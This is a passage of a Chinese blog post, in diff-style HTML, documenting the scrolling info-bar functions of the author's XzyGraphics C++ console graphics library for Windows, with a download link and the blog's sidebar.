+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%88%AA%E5%B1%8F2020-02-10%E4%B8%8B%E5%8D%888.20.49.png" alt="滚动信息栏"><br>&#x2F;&#x2F;又觉得丑(?）还是可以自定义颜色和符号</p>
+<p>滚动信息栏的使用设计和选单很不一样。</p>
+<h2 id="主要成员变量-1"><a href="#主要成员变量-1" class="headerlink" title="主要成员变量"></a>主要成员变量</h2><p><strong>字符串（string）：</strong><br>信息栏标题<strong>title</strong><br>构成信息栏边框的字符<strong>Str</strong></p>
+<p><strong>整型 (int):</strong><br>信息栏左上角坐标<strong>x,y</strong><br>选单标题的颜色<strong>TitleColor</strong><br>信息栏的长度（每行最多显示的长度）<strong>StrLimit</strong><br>信息栏的高度（最多显示多少行）<strong>MaxNum</strong></p>
+<h2 id="成员函数-1"><a href="#成员函数-1" class="headerlink" title="成员函数"></a>成员函数</h2><p><strong>信息栏绘制函数DRAW：</strong><br>提供一个颜色参数，在控制台打印出信息栏的外框<br>无返回值。</p>
+<p><strong>清空函数CLEAR：</strong><br>不需要参数，调用后清理信息栏所在的位置<br>无返回值。</p>
+<p><strong>创造记录函数CREATERECORD</strong><br>创造纪录函数的参数最多为六个，<br>分为三组，每组由颜色和字符串两个参数组成。<br>按顺序称为记录的第一部分，第二部分和第三部分。<br>上面截图的第一条记录只用到了一个部分。<br>第二条用到了三部分。<br>第一部分通常起提示的作用，所以后两个部分如果过长会自动换行并与第一部分对齐。<br><em>现在中文换行可能会出现乱码，后续的更新会解决这个问题。</em><br><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%88%AA%E5%B1%8F2020-02-10%E4%B8%8B%E5%8D%888.20.09.png" alt="换行演示"><br>在实例化一个滚动信息栏对象后，<br>在程序的任何位置调用此函数就能立即在信息栏输出信息。信息过长会自动换行，超过显示的上限会滚动显示。</p>
+<p><strong>滚动函数ROLL</strong><br>两个颜色参数分别指定信息栏外框的颜色和光标指针的颜色。<br>按ws来控制光标上下移动，光标到顶端或底部后继续向上或向下信息栏会开始滚动。<br>按下[ENTER]会返回光标所在的行数。行数从0开始向下递增。<br>按[ESC]返回-1；<br><strong>播放函数DISPLAY</strong><br>提供开始和结束的行数，信息栏就会显示这一段信息。<em>播放不存在的信息会访问到非法内存</em><br><strong>获得记录函数GETRECORD</strong><br>提供行数返回一个RECORD对象。<br><em>直接对信息栏中的信息进行操作可能会导致访问非法内存等问题</em></p>
+<h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>XzyGraphics库只是我在大一时方便自己写程序的工具，分享出来帮助和我一样正在学习的人创造更好看的命令行界面。*(它用起来真的很简单!)*它的不足和缺点还有很多，我也会坚持继续更新。如果你有建议或问题，发送邮件至<a href="mailto:&#x6e;&#x30;&#x70;&#x33;&#x40;&#x6e;&#x79;&#105;&#x73;&#116;&#46;&#101;&#x64;&#117;&#46;&#x63;&#x6e;">&#x6e;&#x30;&#x70;&#x33;&#x40;&#x6e;&#x79;&#105;&#x73;&#116;&#46;&#101;&#x64;&#117;&#46;&#x63;&#x6e;</a>。<br>感谢你花时间来阅读我的第一篇博客。：）</p>
+<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p><a target="_blank" rel="noopener" href="https://n0p3.oss-cn-beijing.aliyuncs.com/source/XzyGraphics%5B2.2%5D.zip">XzyGraphics库</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cdn.n0p3.cn/2020/02/10/C-Windows-XzyGraphics%E5%9B%BE%E5%BD%A2%E5%BA%93/" data-id="cleqs4p6p0006h4d77y6g6524" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/" rel="tag">C++</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9B%BE%E5%BD%A2/" rel="tag">图形</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/">&amp;laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MacOS/" rel="tag">MacOS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB/" rel="tag">WEB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/develop/" rel="tag">develop</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tool/" rel="tag">tool</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%82%E5%8A%A0%E7%9A%84%E6%AF%94%E8%B5%9B/" rel="tag">参加的比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" rel="tag">命令行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9B%BE%E5%BD%A2/" rel="tag">图形</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/C/" style="font-size: 12.5px;">C++</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/MacOS/" style="font-size: 10px;">MacOS</a> <a href="/tags/PWN/" style="font-size: 17.5px;">PWN</a> <a href="/tags/WEB/" style="font-size: 10px;">WEB</a> <a href="/tags/Windows/" style="font-size: 12.5px;">Windows</a> <a href="/tags/develop/" style="font-size: 10px;">develop</a> <a href="/tags/heap/" style="font-size: 10px;">heap</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tool/" style="font-size: 10px;">tool</a> <a href="/tags/%E5%8F%82%E5%8A%A0%E7%9A%84%E6%AF%94%E8%B5%9B/" style="font-size: 15px;">参加的比赛</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" style="font-size: 10px;">命令行</a> <a href="/tags/%E5%9B%BE%E5%BD%A2/" style="font-size: 10px;">图形</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">三月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">二月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/03/02/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/16/N0Shell/">N0Shell</a>
+          </li>
+        
+          <li>
+            <a href="/2020/12/22/FlagSubmitter/">FlagSubmitter</a>
+          </li>
+        
+          <li>
+            <a href="/2020/10/28/BuuWeb1/">BuuWeb1</a>
+          </li>
+        
+          <li>
+            <a href="/2020/10/18/Off-by-one/">Asis_ctf_2016_b00ks</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 N0P3<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
